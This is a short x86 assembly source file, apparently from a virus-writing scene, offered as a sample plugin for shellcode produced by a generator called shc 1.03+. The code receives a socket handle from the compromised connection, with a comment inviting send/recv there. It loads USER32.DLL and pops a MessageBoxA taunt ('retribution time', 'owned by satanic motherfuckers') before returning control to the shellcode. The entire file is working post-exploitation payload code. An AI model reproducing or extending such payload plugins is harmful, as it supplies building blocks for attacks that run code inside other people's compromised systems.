
; sample MsgBox code snippet,
; to be used as a loadable plugin with shc1.03+ generated shellcodes

include                 vxl.ash

                        p586
                        model   flat
                        locals  __

                        .code

                        db      '$START$'

                        mov     esi, [esp+4]    ; socket handle
                        ; you can do send/recv here

                        nop
                        nop

                        call    pop_1
                        db      'USER32.DLL',0
pop_1:                  callK32 LoadLibraryA
                        xchg    ebx, eax        ; ebx=base

                        push    0
                        call    pop_2
                        db      'retribution time',0
pop_2:                  call    pop_3
                        db      'owned by satanic motherfuckers',0
pop_3:                  push    0
                        callANY MessageBoxA     ; uses: ebx=dll base

                        nop
                        nop
back2shellcode:
                        retn

include                 vxl.asi

                        db      '$END$'

                        end
